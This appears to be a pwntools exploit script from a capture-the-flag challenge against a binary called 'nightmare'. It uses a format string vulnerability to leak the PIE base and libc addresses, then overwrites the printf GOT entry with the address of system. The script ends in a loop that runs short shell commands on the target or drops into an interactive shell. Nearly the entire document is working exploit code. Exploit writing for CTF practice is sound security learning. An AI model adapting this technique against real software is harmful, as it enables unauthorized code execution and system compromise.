from pwn import *
import exploit_helper

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
exe = './nightmare'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

def send_payload_scream(payload: bytes):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', payload)
    io.recvuntil(b'> ')
    return io.recvline().strip()


def send_payload_escape(payload: bytes):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', payload)
    io.recvuntil(b'> ')
    ret = io.recvline().strip()

    info('Payload length: %d', len(payload))
    if len(payload) >= 5:
        fix_input_bug()

    return ret


def fix_input_bug():
    io.sendlineafter(b'>', b'222')
    io.recvuntil(b'> ')
    io.recvuntil(b'> ')


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = exploit_helper.start(exe=exe, gdb_script=gdb_script)

# Set up format string
format_string = FmtStr(execute_fmt=send_payload_scream, offset=5)
info('Format string offset: %d', format_string.offset)

# Leak PIE base
leaked_address = int(send_payload_escape('%{}$p'.format(9).encode('ascii')), 16)
info('Leaked address: %#x', leaked_address)

elf.address = leaked_address - 0x14d5
info('PIE base: %#x', elf.address)

# Leak Libc offset
start_main_address = int(send_payload_escape('%{}$p'.format(13).encode('ascii')), 16) - 205
info('Leaked libc_start_main address: %#x', start_main_address)

libc_base_address = start_main_address - exploit_helper.get_symbol_offset('libc6_2.33-6debian_amd64',
                                                                          '__libc_start_main')
info('Leaked libc base address: %#x', libc_base_address)

system_address = libc_base_address + exploit_helper.get_symbol_offset('libc6_2.33-6debian_amd64',
                                                                      'system')
info('Leaked system function address: %#x', system_address)

got_printf_address = elf.address + 0x3568
info('Leaked GOT printf address: %#x', got_printf_address)

format_string.write(got_printf_address, system_address)
format_string.execute_writes()

# Got Shell?
while True:
    command = input('Enter command to run: ')[:-1]
    if len(command) > 5:
        warn('Command too long, must be 5 characters or less!')
    else:
        if command == 'sh' or command == 'zsh':
            io.interactive()
        elif command == '':
            success("Exiting...")
            break
        else:
            io.recvuntil(b'unexpected\n')
            io.sendline(b'2')

            io.recvuntil(b'unexpected\n')

            io.sendline(bytes(command, 'ascii'))
            success(io.recvuntil(b'\nWrong code, buster')[:-21].decode('utf-8'))

            io.recvuntil(b'unexpected\n')
            io.sendline(b'')
